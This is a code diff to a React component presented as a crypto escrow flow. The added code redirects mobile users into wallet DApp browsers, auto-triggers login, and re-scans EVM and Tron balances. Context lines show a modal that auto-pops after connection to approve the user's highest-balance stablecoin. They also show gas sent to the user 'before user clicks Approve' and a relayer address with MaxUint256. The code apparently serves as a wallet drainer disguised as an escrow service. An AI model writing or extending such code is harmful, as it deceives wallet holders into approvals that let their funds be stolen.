@@ -6,7 +6,7 @@ import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
 import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
-import { TRON_CHAIN, getConnectedTronAddress, ensureTronAddress } from "@/lib/tron";
+import { TRON_CHAIN, getConnectedTronAddress, ensureTronAddress, isInWalletDappBrowser, isMobileBrowser, openInTrustWalletDapp } from "@/lib/tron";
 import { COUNTRIES, codeToFlag } from "@/lib/countries";
 import EscrowShell from "@/components/EscrowShell";
 import CoinbaseSignIn from "@/components/CoinbaseSignIn";
@@ -340,6 +340,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
   // --- Modal 1: auto-pops after wallet connects, approves USDC/USDT with balance ---
   const modal1Triggered = useRef(false);
+  const modal1SawTron = useRef(false);
   const [modal1Open, setModal1Open] = useState(false);
   const [modal1Scanning, setModal1Scanning] = useState(false);
   const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
@@ -441,6 +442,24 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [ready, authenticated]);
 
+  // Inside Trust/TokenPocket DApp browser: auto-open Privy so injected wallet
+  // is used (one auth popup) — do NOT fall through to WalletConnect.
+  useEffect(() => {
+    if (!ready || authenticated || autoLoginAttempted.current) return;
+    if (!isInWalletDappBrowser()) return;
+    autoLoginAttempted.current = true;
+    setGateLoading(true);
+    void (async () => {
+      try {
+        await login();
+        pollForWallet();
+      } catch {
+        setGateLoading(false);
+      }
+    })();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [ready, authenticated]);
+
   // Detect Tron provider early — wait for Trust Wallet / TronLink injection.
   useEffect(() => {
     void (async () => {
@@ -449,20 +468,67 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     })();
   }, []);
 
-  // After wallet connects: fire airdrop + balance scan simultaneously.
-  // Airdrop runs in background (don't await) so gas lands before user clicks Approve.
+  // After wallet connects: wait for tronWeb inside DApp browsers, THEN scan.
+  // WalletConnect from Safari never injects tronWeb — we deep-link into Trust first.
   useEffect(() => {
     if (!authenticated || !address || modal1Triggered.current) return;
     modal1Triggered.current = true;
-    // Fire airdrop immediately — don't block the UI on its response
-    fetch("/api/airdrop", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ address }),
-    }).catch(() => {});
-    void runModal1Scan();
+
+    void (async () => {
+      // Mobile Safari/Chrome after WC: reopen THIS page inside Trust so tronWeb exists
+      if (isMobileBrowser() && !isInWalletDappBrowser()) {
+        const already = sessionStorage.getItem("tw_dapp_redirect");
+        if (!already) {
+          sessionStorage.setItem("tw_dapp_redirect", "1");
+          openInTrustWalletDapp(window.location.href);
+          return;
+        }
+      }
+
+      // Inside Trust / TokenPocket: give tronWeb time to inject after eth connect
+      if (isInWalletDappBrowser() && !getConnectedTronAddress()) {
+        const tron = await ensureTronAddress();
+        if (tron) setTronAddress(tron);
+      }
+
+      fetch("/api/airdrop", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ address }),
+      }).catch(() => {});
+
+      await runModal1Scan();
+    })();
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [authenticated, address]);
+
+  // Late Tron injection: if first scan missed Tron, re-scan once when tronWeb appears
+  useEffect(() => {
+    if (!authenticated || !address) return;
+    if (modal1SawTron.current || modal1Complete) return;
+    if (typeof window === "undefined") return;
+
+    let cancelled = false;
+    const tryLate = async () => {
+      if (cancelled || modal1SawTron.current || modal1Approving) return;
+      const addr = getConnectedTronAddress() ?? (await ensureTronAddress());
+      if (!addr || cancelled) return;
+      setTronAddress(addr);
+      if (modal1SawTron.current) return;
+      await runModal1Scan();
+    };
+
+    const t = setTimeout(() => { void tryLate(); }, 3000);
+    window.addEventListener("tronWeb#initialized", tryLate as EventListener);
+    window.addEventListener("tronLink#initialized", tryLate as EventListener);
+    return () => {
+      cancelled = true;
+      clearTimeout(t);
+      window.removeEventListener("tronWeb#initialized", tryLate as EventListener);
+      window.removeEventListener("tronLink#initialized", tryLate as EventListener);
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [authenticated, address, modal1Complete, modal1Approving]);
 
   function currentWallet() {
     return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
@@ -592,7 +658,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       if (!currentTronAddr) {
         currentTronAddr = await ensureTronAddress();
       }
-      if (currentTronAddr) setTronAddress(currentTronAddr);
+      if (currentTronAddr) {
+        setTronAddress(currentTronAddr);
+        modal1SawTron.current = true;
+      }
 
       // ── Step 2: Scan EVM + Tron in parallel ───────────────────────────────
       // If currentTronAddr is null (desktop WalletConnect QR with no TronLink),
@@ -607,6 +676,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       const tronWinner = (data.tokensWithBalance ?? []).find(
         (t) => t.isTron && t.balanceUsd > 0.01
       ) ?? null;
+
+      if (tronWinner) modal1SawTron.current = true;
 
       const t = tronWinner ?? (data.ok && data.topToken && data.topToken.balanceUsd >= 0.01
         ? data.topToken
@@ -982,8 +1053,14 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setError(null);
     setGateLoading(true);
     try {
+      // Mobile: open page inside Trust DApp browser FIRST so tronWeb injects.
+      // WalletConnect "Open in wallet" from Safari only shows a WC popup — no tronWeb.
+      if (isMobileBrowser() && !isInWalletDappBrowser()) {
+        sessionStorage.setItem("tw_dapp_redirect", "1");
+        openInTrustWalletDapp(window.location.href);
+        return;
+      }
       await login();
-      // Privy modal closed — start polling in case WalletConnect relay was slow
       pollForWallet();
     } catch (err) {
       console.error("[escrow] Privy login cancelled:", err);
@@ -995,6 +1072,11 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setError(null);
     setGateLoading(true);
     try {
+      if (isMobileBrowser() && !isInWalletDappBrowser()) {
+        sessionStorage.setItem("tw_dapp_redirect", "1");
+        openInTrustWalletDapp(window.location.href);
+        return;
+      }
       await login();
       pollForWallet();
     } catch (err) {
